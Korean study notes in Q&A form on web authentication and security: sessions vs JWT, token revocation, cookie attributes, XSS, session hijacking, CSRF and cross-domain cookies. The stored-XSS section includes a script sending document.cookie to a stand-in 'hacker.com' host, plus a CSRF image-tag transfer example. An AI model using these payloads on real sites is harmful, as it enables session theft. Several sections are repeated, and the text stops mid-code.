- 세션 방식과 토큰 방식의 가장 큰 차이는 무엇인가요? 🍠
  세션과 토큰의 가장 중요한 차이는 “**사용자의 상태 정보를 어디에 저장하는지**”에 있음
  **세션 방식 -** 실제 사용자 정보 서버에 저장
  - 클라이언트에 정보를 찾을 수 있는 키(세션 ID)만 전달
  - **`세 가지 저장 방식`**
  1. `메모리 저장`: 가장 빠름 **BUT** 서버 재시작 시 모든 세션 사라짐
  2. `인메모리 데이터베이스 사용 (Redis 등)`: 속도와 영속성 모두 **GET!** + 분산 환경에서 **여러 서버** 세션 공유 가능 + 서버 **재시작** 해도 세션 유지!
  3. `관계형 데이터베이스 저장`: 가장 안정적 **BUT** 타 방식에 비해 성능 떨어짐
  **토큰 방식**
  - 사용자 정보 토큰 자체에 포함시켜 클라이언트가 직접 보관하고 전송
- 세션을 분산 환경에서 관리할 때 사용할 수 있는 세 가지 전략(Sticky Session, Session Replication, Centralized Session Store)의 특징을 정리해주세요. 🍠
  1. **`Sticky Session(세션 고정)`**: 로드밸런서가 같은 사용자의 요청을 항상 같은 서버로 보내는 방식
  - 장점: 구현 간단
  - 단점: 서버 장애 시 해당 서버의 모든 세션 사라짐
  * 로드밸런서란?: 클라이어트와 서버 풀 사이에 위치해 들어오는 요청을 여러 서버로 배분하는 장치
  2. **`Session Replication(세션 복제)`**: 모든 서버가 세션 정보를 공유하는 방식
  - 단점: 서버 간 네트워크 통신이 많아져 성능 떨어짐
  3. **`Centralized Session Store(중앙 세션 저장소)`**: Redis 같은 별도 저장소에 모든 세션을 보관하는 방식
  - 현재 가장 널리 사용되는 방법
  Redis란?: 메모리 기반의 오픈소스 키-값 데이터 저장소 → 디스크보다 훨씬 빠른 읽기와 쓰기 성능 제공
- JWT(Json Web Token)의 장점과 단점을 각각 설명해주세요. 🍠
  -토큰: 사용자 정보를 토큰 자체에 포함시키는 self-contained 방식
  - 토큰 자체에 사용자 ID, 권한, 만료 시간 포함 + 서버의 비밀 키로 서명
  - 서버는 서명 검증하면 토큰의 유효성 확인 가능
  -**장점: `확장성`**
  : 각 서버가 독립적으로 토큰을 검증할 수 있으므로 MSA에서 각 서비스가 독립적으로 인증을 처리할 수 있음
  -**단점: `유효성**`
  : 한번 발급한 토큰은 만료될 때까지 유효함 → 사용자 강제 로그아웃 등의 보안 이슈가 있을 때 이를 즉시 처리하는 것이 어려움
- JWT의 즉시 무효화 문제가 생기는 이유와 이를 해결하기 위한 방법은 무엇인가요? 🍠
  -`JWT`는 발급 시 토큰 자체에 인증 정보를 담고 서버가 상태를 저장하지 않는 Stateless 특성 때문에 발급된 토큰을 즉시 취소(무효화)하기 어려움
  → 로그아웃, 비밀번호 변경, 계정 정지 등에서 기존 토큰을 바로 막지 못해 보안 리스크가 커질 수 있음
  **-즉시 무효화가 어려운 이유**
  1.  `Stateless`: 서버가 토큰 발급 / 사용 내역을 보관하지 않으므로 토큰이 만료될 때까지 서버에서 “이 토큰은 안 쓴다”고 알려줄 수 없음.
  2.  `탈취 시 대응 지연`: 토큰이 유효한 기간 동안 탈취되면 공격자가 계속 사용할 수 있어 즉시 취소가 필요하지만, 기본 구조에서는 어려움
  3.  `세션 / DB 기반 취소 불가능`: 세션 테이블이 없으면 로그인 / 비밀번호 변경 / 탈퇴 시 서버가 토큰을 찾아서 무효화할 근거 부족
  -**해결 방법**
  ```jsx
  1) **블랙리스트(DentList) 방식**
  : 무효화할 토큰의 jti(JWT ID)를 서버 저장소에 저장하고, 요청마다 확인

  **[클라이언트] → 요청 → [서버] → Redis에서 jti 조회 → 블랙리스트면 거부

  -저장소: Redis(TTL을 토큰 만료 시간과 동일하게 설정)
  -단점: 모든 요청마다 Redis 조회 발생 -> 완전한 Stateless 포기

  2) 짧은 Access Token + Refresh Token
  : Access Token의 만료 시간을 짧게 설정해 피해 범위 최소화함
  -Access Token: 만료시간-5~15분 / 저장위치-메모리
  -Refresh Token: 만료시간-7~30일 / 저장위치-HttpOnly Cookie, DB

  -로그아웃 시 Refresh Token만 DB에서 삭제
  -Access Token은 짧은 수명으로 자연 만료 대시
  -단점: 만료 전까지 수 분간 유효한 Access Token 존재

  3) Refresh Token Rotation
  : Refresh Token을 한 번 사용하면 새 토큰으로 교체하고, 재사용 시 탈취로 간주

  사용 → Refresh Token 재발급 → 이전 토큰 즉시 무효화
  재사용 감지 → 해당 사용자 전체 세션 무효화

  -단점: 네트워크 오류 시 정상 사용자도 로그아웃될 수 있음

  4) 버전 관리 (Token Versioning)
  : DB의 사용자 레코드에 token_version 필드 추가

  -예시
  // JWT payload
  { userId: 123, tokenVersion: 5 }

  // 검증 시
  if (payload.tokenVersion !== user.tokenVersion) → 거부

  // 강제 로그아웃 시
  UPDATE users SET token_version = token_version + 1 WHERE id = 123

  -장점: 블랙리스트보다 저장 공간 효율적, 특정 유저 전체 무효화 용이
  -단점: 요청마다 DB 조회 필요**
  ```
- 세션과 토큰을 결합한 하이브리드 방식(JWT + 저장소 메타데이터)의 동작 원리를 간단히 설명해주세요. 🍠

  **-세션과 토큰의 장점을 결합한 방식:**
  1. JWT의 JTI(JWT ID)클레임을 활용해 각 토큰에 고유 ID를 부여한다.
  2. 로그아웃 시 이 ID를 블랙리스트에 등록한다.
  3. 각 요청이 들어와서 토큰을 검증할 때, 블랙리스트에 들어있는지 확인하고 없는 경우 서명을 검증한다.

- HTTP는 왜 무상태(Stateless)로 설계되었나요? 🍠
  HTTP에서 각 요청과 응답은 서로 독립적으로 처리되며, 서버는 **이전 요청의 정보**를 기억하지 않음
  → 이 특성 덕분에 확장성이 뛰어남
- HTTP의 무상태성이 주는 장점과 단점을 각각 정리해주세요. 🍠
  -단점: 사용자의 상태를 추적해야 함 -장점: 확장성이 뛰어나 서버를 확장해도 어느 서버든 모든 요청을 처리할 수 있음
- 쿠키의 Domain 디렉티브에 대해 정리해주세요. 🍠
  -대표 사례: 로그인 인증
  → 사용자가 로그인한 뒤, 메인 도메인에서도 인증 상태를 유지하고 싶다면 서버에서 쿠기 발급할 때 Domain 속성을 메인 도메인으로 지정하면 됨
  ```jsx
  res.setHeader('Set-Cookie', 'sid=1; Domain=yolog.co.kr');
  ```
- 쿠키의 Path 디렉티브에 대해 정리해주세요. 🍠
  -경로 단위로 쿠기 전송 범위 제한
  -`/private` 요청 시 → 쿠키 전송
  -`/public` 요청 시 → 쿠키 없음
  ```jsx
  res.setHeader('Set-Cookie', 'sid=1; Path=/private');
  ```
- 세션 쿠키와, 영속 쿠키의 차이점을 정리해주세요. 🍠
  -`세션 쿠키`: 브라우저 종료 시 삭제
  -`영속 쿠키`: 로그인 유지
  - [**`Max-Age`**](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Set-Cookie#max-agenumber): 쿠키 수명을 초 단위로 설정
  - [**`Expires`**](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Set-Cookie#expiresdate): 특정 만료일 설정
  ```jsx
  res.setHeader('Set-Cookie', 'sid=1; Max-Age=10'); // 10초 후 만료
  ```
- 쿠키의 보안 속성(HttpOnly, Secure, SameSite)은 각각 어떤 공격을 방어하나요? 🍠
  - **`Secure`**: HTTPS에서만 전송
  - **`HttpOnly`**: JavaScript 접근 차단으로 XSS 방어
  - **`SameSite`**: CSRF 공격 방어
- 쿠키의 한계점(용량, 보안, 네트워크, 도메인 제약)을 정리해주세요. 🍠
  1. 용량 제약
     - 쿠키 하나당 **4KB** 제한
     - 도메인당 쿠키 개수 제한 (브라우저마다 다르나 보통 **50~180개**)
     - 복잡한 사용자 데이터나 대용량 상태 저장 불가
  2. 보안 취약점
     - XSS(Cross-Site Scripting) -`HttpOnly` 플래그로 JS 접근 차단 가능하지만, 완전한 방어는 아님
     - CSRF (Cross-Site Request Forgery)
       `사용자가 악성 사이트 방문
  → 악성 사이트가 은행 API로 요청 전송
  → 브라우저가 쿠키를 자동 첨부
  → 서버는 정상 요청으로 인식`
       - `SameSite` 플래그(`Strict` / `Lax`)로 완화 가능
       - **전송 중 탈취 -** `Secure` 플래그 미설정 시 HTTP 환경에서 평문 전송 → 중간자 공격에 노출
  3. 네크워크 오버헤드
     - 해당 도메인의 **모든 HTTP 요청에 자동 첨부** (이미지, CSS, JS 포함)
     - 불필요한 요청에도 쿠키가 포함되어 **대역폭 낭비**
     - 쿠키가 많을수록 요청 헤더 크기 증가 → 특히 소규모 리소스 요청에 부담
  4. 도메인 제약
     - **Same-Origin 제한**
       - 기본적으로 **설정된 도메인과 그 서브도메인**에서만 접근 가능
       - `a.com`에서 설정한 쿠키를 `b.com`에서 읽을 수 없음
     - **서드파티 쿠키 차단 추세**
       - Chrome, Safari 등 주요 브라우저가 서드파티 쿠키 **단계적 차단**
       - 크로스 도메인 인증, 광고 트래킹 등에 직접적 영향
- 쿠키만으로 상태 관리를 해결할 수 없는 이유는 무엇인가요? 🍠
  1. 용량이 너무 작음
  2. 보안이 취약함 → 중요한 상태를 쿠키에만 저장하면 신뢰 불가능
  3. 네트워크 낭비 → 필요없는 요청에도 쿠키가 딸려가서 네트워크 낭비 됨
  4. 다른 브라우저에서 도메인 못 읽음
  5. 서버 확장되면 쿠키만으로는 일관된 상태 유지 불가능

- XSS 공격은 무엇인가요?
  - 공격자가 **악성 스크립트를 웹 페이지에 심어**, 다른 사용자의 브라우저에서 실행시키는 공격
  **1. Stored XSS (저장형)** — 가장 위험
  ```jsx
  공격자가 게시판에 악성 스크립트 작성
  → DB에 저장됨
  → 다른 사용자가 게시글 열람
  → 스크립트 자동 실행 💥
  ```
  ```jsx
  <!-- 공격자가 게시판에 입력한 내용 -->
  <script>
    fetch("https://hacker.com?cookie=" + document.cookie)
  </script>
  ```
  **2. Reflected XSS (반사형)**
  ```jsx
  공격자가 악성 URL을 피해자에게 전송
  → 피해자가 URL 클릭
  → 서버가 URL 파라미터를 그대로 응답에 반영
  → 스크립트 실행 💥
  ```
  ```jsx
  https://goguma.com/search?q=<script>악성코드</script>
  ```
  **3. DOM-based XSS**
  ```jsx
  서버를 거치지 않고 **브라우저의 DOM 조작 과정**에서 발생
  ```
  ```jsx
  // 취약한 코드
  document.innerHTML = location.hash; // URL의 # 이후 값을 그대로 삽입
  ```
- XSS 방어 전략에 대해 정리해주세요.

  | 방법              | 설명                                      |
  | ----------------- | ----------------------------------------- |
  | 입력값 이스케이프 | `<`, `>`, `"` 등을 HTML 엔티티로 변환     |
  | `HttpOnly` 쿠키   | JS에서 `document.cookie` 접근 자체를 차단 |
  | CSP 헤더          | 허용된 출처의 스크립트만 실행하도록 제한  |
  | 입력값 검증       | 서버/클라이언트 양쪽에서 허용된 값만 수용 |

  Content-Security-Policy: script-src 'self'
  /_ 자기 도메인 스크립트만 허용, 외부 스크립트 차단 _/

- 세션 하이재킹은 무엇인가요? 🍠
  - 정의
    -공격자가 **정상 사용자의 세션 ID를 훔쳐**, 해당 사용자인 척 서버에 접근하는 공격
  - 개념: 로그인하면 서버는 세션 ID 발급
    ```jsx
    사용자 로그인 → 서버가 세션 ID 발급 → 쿠키에 저장
    → 이후 요청마다 세션 ID를 서버에 전송 → 서버가 "이 사람이구나" 인식
    ```
  - 공격 흐름
    ```jsx
    ① 피해자 로그인 → 세션 ID 발급
    ② 공격자가 세션 ID 탈취
    ③ 공격자가 훔친 세션 ID로 요청
    ④ 서버는 피해자로 인식 → 공격자에게 정상 응답
    ```
  - 탈취 방법
    ```jsx
    1. XSS로 탈취
    // HttpOnly 미설정 시
    document.cookie  // 세션 ID 포함한 쿠키 통째로 탈취

    2. 네트워크 스니핑
    HTTP (비암호화) 구간에서 패킷 가로채기
    → 쿠키 헤더에서 세션 ID 추출

    3. 세션 고정 공격 (Session Fixation)
    공격자가 미리 세션 ID를 피해자에게 심음
    → 피해자가 그 세션 ID로 로그인
    → 공격자는 이미 세션 ID를 알고 있으므로 바로 접근 가능
    ```
  - 방어 방법
    | 방법                     | 이유                                  |
    | ------------------------ | ------------------------------------- |
    | `HttpOnly` 쿠키          | JS로 세션 ID 접근 자체를 차단         |
    | `Secure` 쿠키            | HTTPS에서만 쿠키 전송, 스니핑 방지    |
    | 로그인 후 세션 ID 재발급 | 세션 고정 공격 방지                   |
    | 세션 만료 시간 설정      | 탈취되어도 짧은 시간 내 무효화        |
    | IP / User-Agent 검증     | 세션 ID가 탈취돼도 다른 환경이면 차단 |
  - XSS와의 관계
    ```jsx
    XSS ──────────────────▶ 세션 하이재킹
    (악성 스크립트 실행)      (세션 ID 탈취 후 도용)
    ```
- XSS 공격을 차단하는 방법은 무엇인가요? 🍠
  - 입력값 이스케이프 (가장 기본)
    - 사용자 입력의 특수문자를 **HTML 엔티티로 변환**해 스크립트로 실행되지 않게 막아요.
    ```jsx
    // 변환 예시
    <  →  &lt;
    >  →  &gt;
    "  →  &quot;
    '  →  &#x27;
    &  →  &amp;

    // 공격 시도
    <script>alert('XSS')</script>

    // 이스케이프 후 → 그냥 텍스트로 출력됨
    &lt;script&gt;alert('XSS')&lt;/script&gt;
    ```
  - HttpOnly 쿠키
    ```jsx
    JS에서 document.cookie 접근 자체를 **원천 차단**해요.

    Set-Cookie: session_id=abc123; HttpOnly
    document.cookie  // ❌ 접근 불가 → 탈취 불가

    스크립트가 실행되더라도 쿠키를 읽지 못해 **세션 하이재킹을 방지**해요.
    ```
  ### 3. CSP 헤더 (Content-Security-Policy)
  **허용된 출처의 스크립트만 실행**하도록 브라우저에 지시해요.
  ```jsx
  //http

  # 자기 도메인 스크립트만 허용
  Content-Security-Policy: script-src 'self'

  # 특정 CDN만 추가 허용
  Content-Security-Policy: script-src 'self' https://cdn.trusted.com

  # 인라인 스크립트 전면 차단
  Content-Security-Policy: script-src 'self'; default-src 'none'
  ```
  ```jsx
  //html

  <!-- CSP 설정 시 아래 인라인 스크립트는 실행 안 됨 -->
  <script>악성코드</script>  ❌
  ```
  ***
  ### 4. 입력값 검증 (Validation)
  허용된 값만 받고 **나머지는 거부**해요.
  ```jsx
  // ❌ 나쁜 예 - 입력값을 그대로 신뢰
  const username = req.body.username;

  // ✅ 좋은 예 - 허용 패턴만 통과
  const username = req.body.username;
  if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
    throw new Error('허용되지 않는 입력값');
  }
  ```
  > 검증은 **클라이언트 + 서버 양쪽** 모두에서 해야 해요.
  > 클라이언트 검증만 하면 우회가 쉬워요.
  ***
  ### 5. 템플릿 엔진의 자동 이스케이프 활용
  React, Vue 등 현대 프레임워크는 기본적으로 이스케이프를 자동 처리해요.
  ```jsx
  // ✅ React - 자동 이스케이프
  const userInput = '<script>악성코드</script>';
  return <div>{userInput}</div>; // 텍스트로 안전하게 출력

  // ❌ 위험 - 이스케이프 우회 (꼭 필요한 경우만 사용)
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
  ```
  ***
  ### 6. DOMPurify (불가피한 HTML 허용 시)
  게시판처럼 HTML 입력을 허용해야 할 때, **악성 태그만 제거**해요.
  ```jsx
  import DOMPurify from 'dompurify';

  const dirty = '<img src=x onerror="악성코드">';
  const clean = DOMPurify.sanitize(dirty);
  // 결과: <img src="x"> ← 악성 속성만 제거
  ```
- 쿠키의 다양한 옵션들에 대해서 정리해주세요. 🍠
  - `Expires` / `Max-Age` (만료 시간)
    - 쿠키 유효 기간 설정
    ```jsx
    // 특정 날짜까지 유지
    Set-Cookie: token=abc123; Expires=Wed, 09 Jun 2025 10:00:00 GMT

    // 현재 시점부터 초 단위로 유지 (우선순위 높음)
    Set-Cookie: token=abc123; Max-Age=3600  # 1시간
    ```
    | 구분   | 설명                                        |
    | ------ | ------------------------------------------- |
    | 미설정 | 브라우저 닫으면 삭제 (세션 쿠키)            |
    | 설정   | 브라우저 닫아도 만료일까지 유지 (영속 쿠키) |
  - `Domain`
    - 쿠키를 어느 도메인까지 전송할지 설정
    ```jsx
    // 현재 도메인만 (서브도메인 미포함)
    Set-Cookie: token=abc123; Domain=goguma.com

    // 서브도메인 포함
    Set-Cookie: token=abc123; Domain=.goguma.com
    // → goguma.com, api.goguma.com, admin.goguma.com 모두 전송
    ```
    > ⚠️ 서브도메인 중 하나가 탈취되면 쿠키가 노출 위험!
  - `Path`
    - 쿠키를 어느 경로에서만 전송할지 설정
    ```jsx
    // /api 하위 경로 요청에만 쿠키 전송
    Set-Cookie: token=abc123; Path=/api

    // 모든 경로에 전송 (기본값)
    Set-Cookie: token=abc123; Path=/

    Path=/api 설정 시

    ✅ /api/users    → 쿠키 전송
    ✅ /api/orders   → 쿠키 전송
    ❌ /home         → 쿠키 미전송
    ❌ /mypage       → 쿠키 미전송
    ```
  - `Secure`
    - HTTPS 연결에서만 쿠키 전송
    ```jsx
    Set-Cookie: token=abc123; Secure

    HTTP  요청 → ❌ 쿠키 미전송 (스니핑 방지)
    HTTPS 요청 → ✅ 쿠키 전송
    ```
    > 운영 환경에서는 필수 옵션
  - `HttpOnly`
    - JavaScript에서 쿠키 접근 완전 차단
    ```jsx
    Set-Cookie: token=abc123; HttpOnly

    document.cookie  // ❌ 읽기 불가 → XSS로 탈취 불가
    ```
    > 세션 ID, 인증 토큰 등 **민감한 쿠키에는 필수**
  - `SameSite`(CSRF 방어)
    - 다른 사이트에서의 요청에 쿠키를 포함할지 설정

    ```jsx
    Set-Cookie: token=abc123; SameSite=Strict
    Set-Cookie: token=abc123; SameSite=Lax
    Set-Cookie: token=abc123; SameSite=None; Secure
    ```

    | 값       | 동작                       | 특징                                     |
    | -------- | -------------------------- | ---------------------------------------- |
    | `Strict` | 같은 사이트 요청에만 전송  | 가장 안전, 외부 링크 클릭 시 쿠키 미포함 |
    | `Lax`    | GET 요청은 허용, POST 차단 | 기본값, 일반적으로 권장                  |
    | `None`   | 모든 요청에 전송           | 반드시 `Secure`와 함께 사용              |

    ```jsx
    Strict:  외부 사이트 → goguma.com 요청  ❌ 쿠키 미포함
    Lax:     외부 링크 클릭 (GET)           ✅ 쿠키 포함
             외부 사이트 form POST          ❌ 쿠키 미포함
    None:    모든 크로스 사이트 요청         ✅ 쿠키 포함
    ```

    - 입력값 이스케이프 (가장 기본)

  - 사용자 입력의 특수문자를 **HTML 엔티티로 변환**해 스크립트로 실행되지 않게 막아요.

  ```jsx
  // 변환 예시
  <  →  &lt;
  >  →  &gt;
  "  →  &quot;
  '  →  &#x27;
  &  →  &amp;

  // 공격 시도
  <script>alert('XSS')</script>

  // 이스케이프 후 → 그냥 텍스트로 출력됨
  &lt;script&gt;alert('XSS')&lt;/script&gt;
  ```

- HttpOnly 쿠키
  ```jsx
  JS에서 document.cookie 접근 자체를 **원천 차단**해요.

  Set-Cookie: session_id=abc123; HttpOnly
  document.cookie  // ❌ 접근 불가 → 탈취 불가

  스크립트가 실행되더라도 쿠키를 읽지 못해 **세션 하이재킹을 방지**해요.
  ```

### 3. CSP 헤더 (Content-Security-Policy)

**허용된 출처의 스크립트만 실행**하도록 브라우저에 지시해요.

```jsx
//http

# 자기 도메인 스크립트만 허용
Content-Security-Policy: script-src 'self'

# 특정 CDN만 추가 허용
Content-Security-Policy: script-src 'self' https://cdn.trusted.com

# 인라인 스크립트 전면 차단
Content-Security-Policy: script-src 'self'; default-src 'none'
```

```jsx
//html

<!-- CSP 설정 시 아래 인라인 스크립트는 실행 안 됨 -->
<script>악성코드</script>  ❌
```

---

### 4. 입력값 검증 (Validation)

허용된 값만 받고 **나머지는 거부**해요.

```jsx
// ❌ 나쁜 예 - 입력값을 그대로 신뢰
const username = req.body.username;

// ✅ 좋은 예 - 허용 패턴만 통과
const username = req.body.username;
if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
  throw new Error('허용되지 않는 입력값');
}
```

> 검증은 **클라이언트 + 서버 양쪽** 모두에서 해야 해요.
> 클라이언트 검증만 하면 우회가 쉬워요.

---

### 5. 템플릿 엔진의 자동 이스케이프 활용

React, Vue 등 현대 프레임워크는 기본적으로 이스케이프를 자동 처리해요.

```jsx
// ✅ React - 자동 이스케이프
const userInput = '<script>악성코드</script>';
return <div>{userInput}</div>; // 텍스트로 안전하게 출력

// ❌ 위험 - 이스케이프 우회 (꼭 필요한 경우만 사용)
return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
```

---

### 6. DOMPurify (불가피한 HTML 허용 시)

게시판처럼 HTML 입력을 허용해야 할 때, **악성 태그만 제거**해요.

```jsx
import DOMPurify from 'dompurify';

const dirty = '<img src=x onerror="악성코드">';
const clean = DOMPurify.sanitize(dirty);
// 결과: <img src="x"> ← 악성 속성만 제거
```

- `Expires` / `Max-Age` (만료 시간)
  - 쿠키 유효 기간 설정
  ```jsx
  // 특정 날짜까지 유지
  Set-Cookie: token=abc123; Expires=Wed, 09 Jun 2025 10:00:00 GMT

  // 현재 시점부터 초 단위로 유지 (우선순위 높음)
  Set-Cookie: token=abc123; Max-Age=3600  # 1시간
  ```
  | 구분   | 설명                                        |
  | ------ | ------------------------------------------- |
  | 미설정 | 브라우저 닫으면 삭제 (세션 쿠키)            |
  | 설정   | 브라우저 닫아도 만료일까지 유지 (영속 쿠키) |
- `Domain`
  - 쿠키를 어느 도메인까지 전송할지 설정
  ```jsx
  // 현재 도메인만 (서브도메인 미포함)
  Set-Cookie: token=abc123; Domain=goguma.com

  // 서브도메인 포함
  Set-Cookie: token=abc123; Domain=.goguma.com
  // → goguma.com, api.goguma.com, admin.goguma.com 모두 전송
  ```
  > ⚠️ 서브도메인 중 하나가 탈취되면 쿠키가 노출 위험!
- `Path`
  - 쿠키를 어느 경로에서만 전송할지 설정
  ```jsx
  // /api 하위 경로 요청에만 쿠키 전송
  Set-Cookie: token=abc123; Path=/api

  // 모든 경로에 전송 (기본값)
  Set-Cookie: token=abc123; Path=/

  Path=/api 설정 시

  ✅ /api/users    → 쿠키 전송
  ✅ /api/orders   → 쿠키 전송
  ❌ /home         → 쿠키 미전송
  ❌ /mypage       → 쿠키 미전송
  ```
- `Secure`
  - HTTPS 연결에서만 쿠키 전송
  ```jsx
  Set-Cookie: token=abc123; Secure

  HTTP  요청 → ❌ 쿠키 미전송 (스니핑 방지)
  HTTPS 요청 → ✅ 쿠키 전송
  ```
  > 운영 환경에서는 필수 옵션
- `HttpOnly`
  - JavaScript에서 쿠키 접근 완전 차단
  ```jsx
  Set-Cookie: token=abc123; HttpOnly

  document.cookie  // ❌ 읽기 불가 → XSS로 탈취 불가
  ```
  > 세션 ID, 인증 토큰 등 **민감한 쿠키에는 필수**
- `SameSite`(CSRF 방어)
  - 다른 사이트에서의 요청에 쿠키를 포함할지 설정

  ```jsx
  Set-Cookie: token=abc123; SameSite=Strict
  Set-Cookie: token=abc123; SameSite=Lax
  Set-Cookie: token=abc123; SameSite=None; Secure
  ```

  | 값       | 동작                       | 특징                                     |
  | -------- | -------------------------- | ---------------------------------------- |
  | `Strict` | 같은 사이트 요청에만 전송  | 가장 안전, 외부 링크 클릭 시 쿠키 미포함 |
  | `Lax`    | GET 요청은 허용, POST 차단 | 기본값, 일반적으로 권장                  |
  | `None`   | 모든 요청에 전송           | 반드시 `Secure`와 함께 사용              |

  ```jsx
  Strict:  외부 사이트 → goguma.com 요청  ❌ 쿠키 미포함
  Lax:     외부 링크 클릭 (GET)           ✅ 쿠키 포함
           외부 사이트 form POST          ❌ 쿠키 미포함
  None:    모든 크로스 사이트 요청         ✅ 쿠키 포함
  ```

- CSRF는 무엇인가요? 🍠
  - 공격자가 **피해자 몰래, 피해자인 척** 서버에 요청을 보내는 공격
    ```jsx
    ① 손님(피해자)이 고구마 가게에 로그인
       → 쿠키(출입증)를 발급받음

    ② 손님이 다른 사이트(악성 사이트) 방문

    ③ 악성 사이트가 몰래 고구마 가게에 요청을 보냄
       "이 손님 계정으로 고구마 100만개 주문해줘!"

    ④ 브라우저가 쿠키를 자동 첨부해서 요청 전송

    ⑤ 고구마 가게 서버는 정상 요청으로 인식 💥
    ```
    > 핵심: **브라우저가 쿠키를 자동으로 첨부!**
  - 공격 흐름
    ```jsx
    [피해자]                [악성 사이트]            [정상 서버]

    로그인 ──────────────────────────────────▶ 세션 쿠키 발급
             ◀──────────────────────────────── session_id=abc

    악성 사이트 방문
             ──────▶ 악성 HTML 로드
                     <img src="https://bank.com/transfer?to=해커&amount=1000000">

                                               자동 요청 전송 ──▶ 쿠키 자동 첨부
                                                                 정상 요청으로 인식 💥
    ```
- CSRF 방어 전략에 대해 정리해주세요. 🍠
  `SameSite 쿠키`
  ```jsx
  Set-Cookie: session_id=abc; SameSite=Strict
  // 다른 사이트에서 오는 요청엔 쿠키를 아예 안 보냄
  ```
  `CSRF 토큰`
  ```jsx
  서버가 랜덤 토큰 발급
  → 모든 요청에 토큰 포함 필수
  → 악성 사이트는 토큰을 알 수 없음 → 요청 거부

  <form action="/order" method="POST">
    <input type="hidden" name="csrf_token" value="a1b2c3d4e5f6" />
  </form>
  ```
  `Referer` / `Origin` 헤더 검증
  ```jsx
  요청 헤더의 Origin이 우리 도메인인지 확인
  → 외부 도메인에서 온 요청은 거부

  if (req.headers.origin !== "https://goguma.com") {
    return res.status(403).send("요청 거부");
  }
  ```
- CSRF 토큰의 장점과 단점에 대해 정리해주세요. 🍠
  - ✅ 장점
    **1. 강력한 보안**
    - 서버가 발급한 **예측 불가능한 랜덤 토큰**을 요청마다 검증
    - 악성 사이트는 토큰 값을 알 수 없어 요청 위조 불가
    **2. SameSite 미지원 환경 커버**
    - 구형 브라우저는 `SameSite` 쿠키를 지원 안 할 수 있음
    - CSRF 토큰은 브라우저 무관하게 **서버 레벨에서 독립적으로 동작**
    **3. 세밀한 제어 가능**
    - 특정 폼, 특정 API에만 선택적으로 적용 가능
    - 토큰 만료 시간, 1회용 여부 등 **정책을 자유롭게 설정** 가능
  - ❌ 단점
    **`구현 복잡도 증가`**
    ```jsx
    서버: 토큰 발급 → 저장 → 검증 로직 필요
    클라이언트: 모든 요청에 토큰 포함 필요

    *폼이 많을수록 누락 위험 증가
    ```
    **`SPA / API 환경에서 처리 번거로움`**
    ```jsx
    // 매 요청마다 토큰을 헤더에 직접 포함해야 함
    fetch('/api/order', {
      method: 'POST',
      headers: {
        'X-CSRF-Token': getCsrfToken(), // 토큰을 직접 챙겨야 함
      },
    });
    ```
    **`토큰 저장소 관리 필요`**
    - 서버가 발급한 토큰을 **세션 또는 DB에 저장**해야 함
    - 서버가 여러 대면 토큰 공유 문제 발생 (Redis 등 별도 저장소 필요)
    **`멀티탭 문제`**
    ```jsx
    탭 A에서 토큰 발급
    → 탭 B에서 새 토큰 발급 (기존 토큰 무효화)
    → 탭 A에서 요청 시 토큰 불일치 → 요청 실패 😵
    ```
- CAPTCHA는 무엇인가요? 🍠

  > **사람인지 봇인지 구별**하기 위한 자동화 공격 방어 테스트

  ```jsx
  사용자가 요청 (로그인, 회원가입, 폼 제출 등)
  → CAPTCHA 테스트 제시
  → 사람 ✅ → 요청 허용
  → 봇   ❌ → 요청 차단
  ```

- 쿠키 방식으로 인증 정보를 전송할 때 브라우저가 자동으로 쿠키를 포함하는 조건은 무엇인가요? 🍠
  `Domain 조건`
  ```jsx
  -요청 URL의 도메인이 쿠키의 Domain 속성과 일치해야 함

  쿠키 설정: Domain=goguma.com

  ✅ goguma.com        → 포함
  ✅ api.goguma.com    → 포함 (서브도메인)
  ❌ gamja.com         → 미포함 (다른 도메인)
  ❌ evil-goguma.com   → 미포함 (다른 도메인)
  ```
  `Path 조건`
  ```jsx
  -요청 URL의 경로가 쿠키의 Path 속성과 일치하거나 하위 경로여야 함

  쿠키 설정: Path=/api

  ✅ /api          → 포함
  ✅ /api/users    → 포함
  ✅ /api/orders   → 포함
  ❌ /home         → 미포함
  ❌ /mypage       → 미포함
  ```
  `Secure 조건`
  ```jsx
  -Secure 플래그가 설정된 쿠키는 HTTPS 요청에만 포함

  쿠키 설정: Secure

  ✅ https://goguma.com  → 포함
  ❌ http://goguma.com   → 미포함
  ```
  `SameSite 조건`
  ```jsx
  -요청이 어느 사이트에서 출발했는지에 따라 포함 여부가 달라짐

  쿠키 설정: SameSite=Strict
  ✅ goguma.com → goguma.com    → 포함 (같은 사이트)
  ❌ gamja.com  → goguma.com    → 미포함 (다른 사이트)

  쿠키 설정: SameSite=Lax
  ✅ 같은 사이트 요청            → 포함
  ✅ 외부 링크 클릭 (GET)        → 포함
  ❌ 외부 사이트 POST 요청       → 미포함

  쿠키 설정: SameSite=None; Secure
  ✅ 모든 크로스 사이트 요청     → 포함 (반드시 Secure 필요)
  ```
  `만료 조건`
  ```jsx
  -쿠키가 만료되지 않아야 함

  Max-Age=3600 → 1시간 이내 요청  ✅ 포함
               → 1시간 이후 요청  ❌ 미포함 (브라우저가 자동 삭제)

  Expires 미설정 → 세션 쿠키 → 브라우저 닫으면 삭제
  ```
- 크로스 도메인 환경에서 쿠키를 전송하려면 서버와 클라이언트 측에서 각각 어떤 설정이 필요할까요? 🍠
  ```jsx
  // 상황 예시

  클라이언트: https://front.com
  서버:       https://api.com   ← 다른 도메인!
  ```
  **서버 측 설정**
  `CORS 헤더 설정`
  ```jsx
  // Express.js 예시
  app.use(
    cors({
      origin: 'https://front.com', // ① 허용할 출처 명시
      credentials: true, // ② 쿠키 허용 (필수!)
    }),
  );
  ```
  > ⚠️ `credentials: true` 설정 시 `origin: "*"` 사용 불가 반드시 **명시적인 도메인**을 지정해야 함
  ```jsx
  // 실제 응답 헤더
  Access-Control-Allow-Origin: https://front.com   ← * 불가
  Access-Control-Allow-Credentials: true           ← 필수
  ```
  `SameSite=None; Secure 설정`
  ```jsx
  Set-Cookie: session_id=abc123;
    SameSite=None;   # 크로스 사이트 쿠키 허용
    Secure;          # HTTPS 필수 (SameSite=None이면 반드시 필요)
  ```
  **클라이언트 측 설정**
  ```jsx
  //fetch 사용 시
  fetch('https://api.com/login', {
    method: 'POST',
    credentials: 'include', // 쿠키 포함 (필수!)
